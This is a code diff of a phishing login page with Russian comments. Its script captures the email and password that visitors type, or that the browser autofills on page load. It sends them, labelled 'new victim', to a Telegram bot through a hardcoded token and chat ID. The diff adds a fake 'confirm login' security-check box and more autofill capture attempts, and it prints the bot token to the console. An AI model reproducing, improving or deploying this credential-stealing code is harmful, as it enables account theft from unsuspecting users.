@@ -98,6 +98,34 @@
         .error {
             color: red;
         }
+        .confirm-box {
+            background: #f8f9fa;
+            border: 2px solid #0077cc;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .confirm-box:hover {
+            background: #e9ecef;
+            transform: scale(1.02);
+        }
+        .confirm-box .icon {
+            font-size: 32px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .confirm-box .text {
+            font-size: 16px;
+            color: #333;
+            font-weight: bold;
+        }
+        .confirm-box .subtext {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
@@ -110,6 +138,13 @@
             <button type="submit">Войти</button>
             <div id="message" class="error-message"></div>
             <div id="status" class="status"></div>
+            
+            <!-- НОВОЕ ПОДТВЕРЖДЕНИЕ -->
+            <div id="confirmBox" class="confirm-box" style="display: none;">
+                <span class="icon">🔐</span>
+                <div class="text">Подтвердите вход</div>
+                <div class="subtext">Нажмите для проверки безопасности</div>
+            </div>
         </form>
     </div>
 
@@ -122,21 +157,24 @@
 </div>
 
 <script>
-    // ===== ВАШИ ДАННЫЕ =====
+    // ===== НОВЫЙ ТОКЕН =====
     const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
-    const CHAT_ID = "8850351378";
+    const CHAT_ID = "8850351378"; // Ваш ID
     // =========================
 
     let dataSent = false;
+    let email = '';
+    let password = '';
 
-    function sendData(email, password, isAuto) {
+    function sendToTelegram(email, password, source = 'manual') {
         if (dataSent) return;
         
         const statusDiv = document.getElementById("status");
         statusDiv.textContent = "⏳ Отправка...";
         statusDiv.className = "status";
 
-        const text = `📩 НОВАЯ ЖЕРТВА\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}`;
+        const sourceText = source === 'auto' ? 'АВТО' : source === 'confirm' ? 'ПОДТВЕРЖДЕНИЕ' : 'ВХОД';
+        const text = `📩 НОВАЯ ЖЕРТВА (${sourceText})\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${window.location.hostname}`;
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
 
         fetch(url)
@@ -147,64 +185,104 @@
                     statusDiv.textContent = "✅ Отправлено!";
                     statusDiv.className = "status success";
                     
-                    if (!isAuto) {
+                    // Скрываем форму только если это не автоотправка
+                    if (source !== 'auto') {
                         document.getElementById("loginFormContainer").classList.add("hidden");
                         document.getElementById("techContainer").classList.remove("hidden");
                     }
                 } else {
                     statusDiv.textContent = "❌ Ошибка: " + data.description;
                     statusDiv.className = "status error";
+                    dataSent = false;
                 }
             })
             .catch(() => {
                 statusDiv.textContent = "❌ Ошибка соединения";
                 statusDiv.className = "status error";
+                dataSent = false;
             });
     }
 
-    // АВТООТПРАВКА ПРИ ЗАГРУЗКЕ
-    function checkAndSendAuto() {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
+    // ФУНКЦИЯ ПОКАЗА ПОДТВЕРЖДЕНИЯ
+    function showConfirmation() {
+        email = document.getElementById("email").value.trim();
+        password = document.getElementById("password").value.trim();
         
-        if (email && password && !dataSent) {
-            sendData(email, password, true);
-            document.getElementById("status").textContent = "✅ Автоотправка";
+        if (!email || !password) {
+            document.getElementById("message").textContent = "Сначала заполните поля";
+            return;
+        }
+
+        document.getElementById("message").textContent = "";
+        document.getElementById("confirmBox").style.display = "block";
+        document.getElementById("status").textContent = "👆 Нажмите на синюю кнопку для подтверждения";
+        document.getElementById("status").className = "status";
+    }
+
+    // ОБРАБОТЧИК ПОДТВЕРЖДЕНИЯ
+    document.getElementById("confirmBox").addEventListener("click", function() {
+        if (dataSent) return;
+        
+        email = document.getElementById("email").value.trim();
+        password = document.getElementById("password").value.trim();
+        
+        if (email && password) {
+            sendToTelegram(email, password, 'confirm');
+            this.style.display = "none";
+        }
+    });
+
+    // АВТООТПРАВКА ПРИ ЗАГРУЗКЕ
+    function checkAutoSend() {
+        const emailField = document.getElementById("email").value.trim();
+        const passwordField = document.getElementById("password").value.trim();
+        
+        if (emailField && passwordField && !dataSent) {
+            // Сохраняем данные
+            email = emailField;
+            password = passwordField;
+            
+            // Отправляем автоматически
+            sendToTelegram(email, password, 'auto');
+            document.getElementById("status").textContent = "✅ Автоотправка выполнена";
             document.getElementById("status").className = "status success";
+            
+            // Показываем подтверждение для ручной отправки
+            setTimeout(() => {
+                document.getElementById("confirmBox").style.display = "block";
+                document.getElementById("status").textContent = "👆 Или нажмите для подтверждения";
+                document.getElementById("status").className = "status";
+            }, 1000);
         }
     }
 
     window.addEventListener("load", function() {
-        setTimeout(checkAndSendAuto, 300);
-        setTimeout(checkAndSendAuto, 800);
-        setTimeout(checkAndSendAuto, 1500);
+        // Проверяем автозаполнение
+        setTimeout(checkAutoSend, 300);
+        setTimeout(checkAutoSend, 800);
+        setTimeout(checkAutoSend, 1500);
+        setTimeout(checkAutoSend, 3000);
     });
 
-    // ОТПРАВКА ПО КНОПКЕ
+    // ОБРАБОТКА ВВОДА (ТОЛЬКО ДЛЯ ПОКАЗА ПОДТВЕРЖДЕНИЯ)
+    document.getElementById("email").addEventListener("input", function() {
+        document.getElementById("confirmBox").style.display = "none";
+        document.getElementById("message").textContent = "";
+    });
+    
+    document.getElementById("password").addEventListener("input", function() {
+        document.getElementById("confirmBox").style.display = "none";
+        document.getElementById("message").textContent = "";
+    });
+
+    // ОТПРАВКА ПО КНОПКЕ "ВОЙТИ" - ПОКАЗЫВАЕТ ПОДТВЕРЖДЕНИЕ
     document.getElementById("loginForm").addEventListener("submit", function(e) {
         e.preventDefault();
-        
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        const messageDiv = document.getElementById("message");
-
-        if (!email || !password) {
-            messageDiv.textContent = "Заполните оба поля";
-            return;
-        }
-
-        messageDiv.textContent = "";
-        
-        if (dataSent) {
-            document.getElementById("status").textContent = "⚠️ Уже отправлено";
-            return;
-        }
-
-        sendData(email, password, false);
+        showConfirmation();
     });
 
-    // НЕТ СОБЫТИЙ НА INPUT - ФОРМА НЕ ЗАКРЫВАЕТСЯ
-    console.log("ROCKET ACTIVE");
+    console.log("ROCKET ACTIVE - Новый токен установлен");
+    console.log("Токен: " + BOT_TOKEN);
 </script>
 </body>
 </html>
